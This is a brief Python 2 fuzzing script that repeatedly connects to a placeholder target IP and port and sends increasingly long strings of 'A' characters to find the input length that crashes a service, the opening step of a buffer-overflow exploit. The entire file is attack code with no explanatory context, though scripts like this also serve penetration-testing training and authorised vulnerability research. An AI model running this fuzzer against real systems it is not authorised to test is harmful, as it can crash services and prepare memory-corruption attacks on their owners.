#!/usr/bin/python
import socket

for i in range(30):
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('<TARGET_IP_ADDRESS>',<TARGET_PORT>))
 payload = int(i)*("A"*100)
 s.send(payload+"\r\n")
 print "[Info] Fuzzing with " + str(len(str(payload))) + " A's\r\n"
 s.close()
